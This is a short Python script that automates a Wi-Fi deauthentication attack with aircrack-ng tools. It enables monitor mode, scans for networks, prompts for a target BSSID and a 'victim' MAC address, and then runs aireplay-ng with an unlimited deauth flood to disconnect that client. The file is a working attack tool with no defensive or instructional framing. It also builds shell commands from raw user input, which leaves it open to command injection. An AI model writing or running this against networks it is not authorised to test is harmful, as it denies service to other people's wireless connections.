import os
interface=input("Interface:")
os.system(f"sudo airmon-ng start {interface}")
try:
	os.system(f"sudo airodump-ng {interface}mon")
except:
        print("Error")
try:
	channel=input("Wifi's channel:")
	bssid=input("Wifi's bssid:")
except:
        print("Error")
try:
	os.system(f"sudo airodump-ng -c {channel} --bssid {bssid} {interface}mon")
except:
        print("Error")
try:
	victim=input("Victim's MAC or bssid:")
except:
        print("Error")
try:
	os.system(f"sudo aireplay-ng  -0  0  -a  {bssid} -c {victim} {interface}mon")
except:
	print("Error")
try:
	os.system(f"sudo airmon-ng stop {interface}mon")
except:
	print("Error")
os.system("clear")
print("Attack has been stopped.")
